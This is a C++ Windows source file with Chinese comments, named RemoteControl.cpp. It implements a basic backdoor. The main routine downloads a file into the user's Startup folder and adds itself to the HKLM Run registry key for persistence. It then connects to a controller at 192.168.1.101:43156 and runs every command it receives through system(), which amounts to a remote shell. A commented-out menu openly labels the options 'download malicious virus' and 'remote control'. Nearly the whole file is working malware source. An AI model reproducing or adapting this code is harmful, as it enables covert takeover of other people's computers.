// RemoteControl.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include<iostream>
#include<WinSock2.h>
#include<Windows.h>
#include<urlmon.h>
#pragma comment(lib,"urlmon.lib")//这是一个预编译指令
#pragma comment(lib,"ws2_32.lib")
using namespace std;

BOOL SetRegKeyAutoRun(wchar_t *szKeyName, wchar_t *szPath, const int nPathLen)
{
	bool bRet = false;
	HKEY hKey = { 0 };
	do {
		if (wcslen(szKeyName) == 0)
			break;
		if (wcslen(szPath) == 0)
			break;
		if (nPathLen <= 0)
			break;
		wchar_t *szKeyPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
		//如果想要修改注册表需要调用系统API  这是个一打开注册表的函数                                              这是32位注册列表    这是64位的
		if (ERROR_SUCCESS != RegOpenKeyEx(HKEY_LOCAL_MACHINE, szKeyPath, NULL, KEY_WRITE | KEY_WOW64_64KEY, &hKey))
			//第一个值是注册列表最大的那个文件夹名字类似HKEY_LOCAK_MACHINE
			//第二个值是具体路径，就是想放到注册列表那个文件夹中。
			//第四个值是获取的权限是什么
			//开机启动除了RUN还有别的地方HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon中的Userinit
			break;
		if (ERROR_SUCCESS != RegSetValueEx(hKey, szKeyName, 0, REG_SZ, (byte*)szPath, nPathLen))
			//第一个值是我们得到的值
			//第二个是我们想设置这个键的名称
			//第四个是键的类型
			//第五个是键的内容
			//第六个是键的大小
			break;
		bRet = true;




	} while (false);
	if (hKey)
		RegCloseKey(hKey);
	return bRet;

}






int main()
{
	
	wchar_t szUrl[MAXBYTE] = L"https://gss2.bdstatic.com/9fo3dSag_xI4khGkpoWK1HF6hhy/baike/s%3D220/sign=f28cef68ac18972ba73a07c8d6cc7b9d/8718367adab44aed0ce96d98b41c8701a18bfb23.jpg";
	wchar_t szPath[MAX_PATH] = L"C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\love.jpg";
	//如果下载完成是S_OK
	if (S_OK == URLDownloadToFile(nullptr, szUrl, szPath, 0, nullptr))
	{
		
		//printf("下载完成！！！！\r\n");
	}
	else
	{
		printf("失败了！！！！\r\n");
	}



	wchar_t szFilePath[MAX_PATH] = { 0 };//文件的路径
										 //获取文件的路径
										 //使用nullptr会默认取本文件
	int nError = GetModuleFileName(nullptr, szFilePath, MAX_PATH);
	//判断是否出错了
	//ERROR_SUCCESS表示执行成功
	if (ERROR_SUCCESS != nError)
	{
		//错误
		//缓冲区过小无法存放路径
		
	}
	if (!SetRegKeyAutoRun(L"Ascotb", szFilePath, (wcslen(szFilePath) + 1) * 2))
	{
		printf("修改注册表失败！！！！");
	}


		WSADATA wsaData;
		WSAStartup(MAKEWORD(2, 2), &wsaData);
		//判断版本
		if (2 != LOBYTE(wsaData.wVersion) || 2 != HIBYTE(wsaData.wVersion))
		{
			return 0;

		}
		//把socket消息传到容器中
		SOCKET socketClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (INVALID_SOCKET == socketClient)
		{
			return 0;

		}


		sockaddr_in addServer = { 0 };
		///创建....
		addServer.sin_family = AF_INET;
		//创建端口
		addServer.sin_port = htons(43156);
		//获取服务器地址
		addServer.sin_addr.S_un.S_addr = inet_addr("192.168.1.101");
		//创建发送连接
		if (SOCKET_ERROR == connect(socketClient, (SOCKADDR*)&addServer, sizeof(addServer)))
		{
			return 0;
		}
		//创建接受服务器传入命令的数组
		char szBuffer[MAXBYTE] = { 0 };
		char szComment[MAXBYTE] = { 0 };
		//恒为真，如果连上不停的接收服务器的消息
		while (true)
		{
			//接收命令
			int nRecvLen = recv(socketClient, szBuffer, MAXBYTE, 0);
			//判断接收的命令，如果大于0表示有消息
			if (nRecvLen>0)
			{
				//由于接受命令只能执行一个不能多个执行所以添加一下代码
				sprintf_s(szComment, MAXBYTE, "start %s", szBuffer);
				//使用经过上面处理后接收的命令
				system(szComment);
			}

		}


	















	/*


	int nInput = 0;
	printf("请输入需要选着的功能：\r\n\t1.设置本程序为开机启动\r\n\t2.下载恶意病毒\r\n\t3.远程控制\r\n\t");
	scanf("%d", &nInput);
	switch (nInput)
	{
	case 1://修改注册表
	{//case如果加入了变量必须使用大括号
		wchar_t szFilePath[MAX_PATH] = { 0 };//文件的路径
											 //获取文件的路径
											 //使用nullptr会默认取本文件
		int nError = GetModuleFileName(nullptr, szFilePath, MAX_PATH);
		//判断是否出错了
		//ERROR_SUCCESS表示执行成功
		if (ERROR_SUCCESS != nError)
		{
			//2种错误
			//第一个缓冲区过小无法存放路径
			//
		}
		if (!SetRegKeyAutoRun(L"AutoRun", szFilePath, (wcslen(szFilePath) + 1) * 2))
		{
			printf("修改注册表失败！！！！");
		}
	}
	break;
	case 2://下载
	{
		wchar_t szUrl[MAXBYTE] = L"";
		wchar_t szPath[MAX_PATH] = L"C:\\demo.exe";
		//如果下载完成是S_OK
		if (S_OK == URLDownloadToFile(nullptr, szUrl, szPath, 0, nullptr))
		{
			printf("下载完成！！！！\r\n");
		}
		else
		{
			printf("失败了！！！！\r\n");
		}
	}
	break;
	case 3://远程控制
	{

		WSADATA wsaData;
		WSAStartup(MAKEWORD(2, 2), &wsaData);
		//判断版本
		if (2 != LOBYTE(wsaData.wVersion) || 2 != HIBYTE(wsaData.wVersion))
		{
			break;

		}
		//把socket消息传到容器中
		SOCKET socketClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (INVALID_SOCKET == socketClient)
		{
			break;

		}


		sockaddr_in addServer = { 0 };
		///创建....
		addServer.sin_family = AF_INET;
		//创建端口
		addServer.sin_port = htons(43156);
		//获取服务器地址
		addServer.sin_addr.S_un.S_addr = inet_addr("192.168.1.3");
		//创建发送连接
		if (SOCKET_ERROR == connect(socketClient, (SOCKADDR*)&addServer, sizeof(addServer)))
		{
			break;
		}
		//创建接受服务器传入命令的数组
		char szBuffer[MAXBYTE] = { 0 };
		char szComment[MAXBYTE] = { 0 };
		//恒为真，如果连上不停的接收服务器的消息
		while (true)
		{
			//接收命令
			int nRecvLen = recv(socketClient, szBuffer, MAXBYTE, 0);
			//判断接收的命令，如果大于0表示有消息
			if (nRecvLen>0)
			{
				//由于接受命令只能执行一个不能多个执行所以添加一下代码
				sprintf_s(szComment, MAXBYTE, "start %s", szBuffer);
				//使用经过上面处理后接收的命令
				system(szComment);
			}

		}


	}
	break;
	default:
		break;
	}

	*/
	WSACleanup();
	system("pause");
	return 0;
}


//int main()
//{
//	下载URL
//	wchar_t szUrl[MAXBYTE] = L"";
//	存放的位置
//	wchar_t szPath[MAX_PATH] = L"C:\\MyDownLoad.exe";
//	URLDownloadToFile(nullptr, szUrl, szPath, 0, nullptr);
//
//
//
//	return 0;
//}
//
